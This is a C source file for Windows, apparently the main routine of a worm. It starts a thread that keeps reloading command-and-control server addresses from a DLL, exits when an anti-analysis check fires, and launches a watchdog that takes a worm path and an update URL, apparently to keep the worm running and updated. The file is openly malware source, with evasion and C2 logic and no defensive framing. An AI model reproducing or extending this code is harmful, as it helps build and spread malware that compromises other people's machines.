#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "watchdog.h"
#include "def.h"
#include "p2p_loader.h"

#define P2P_DLL_PATH "c2_config.dll"
#define P2P_REFRESH_INTERVAL_MS 30000 

// reloads C2 addresses from the DLL
static DWORD WINAPI P2PLoaderThread(LPVOID lpParam) {
    (void)lpParam;
    P2PConfig cfg;
    while (1) {
        if (p2p_init(P2P_DLL_PATH, &cfg) == 0) {
            for (unsigned int i = 0; i < cfg.count; i++) {
                printf("P2P C2[%u]: %s\n", i, cfg.addresses[i]);
            }
            p2p_cleanup(&cfg);
        } else {
            fprintf(stderr, "P2P loader failed to load '%s'\n", P2P_DLL_PATH);
        }
        Sleep(P2P_REFRESH_INTERVAL_MS);
    }
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <path_to_worm> <update_URL>\n", argv[0]);
        return 1;
    }
    if (is_compromised()) {
        fprintf(stderr, "Anti-analysis check triggered; terminating.\n");
        return 1;
    }

    // Start P2P loader thread
    HANDLE hThread = CreateThread(
        NULL,               // default security
        0,                  // default stack size
        P2PLoaderThread,    // thread proc
        NULL,               // thread param
        0,                  // run immediately
        NULL                // thread id not needed
    );
    if (!hThread) {
        fprintf(stderr, "Failed to create P2P loader thread: %lu\n", GetLastError());
        return 1;
    }
    CloseHandle(hThread);

    const char *worm_path  = argv[1];
    const char *update_url = argv[2];

    start_watchdog(worm_path, update_url);

    return 0;
}
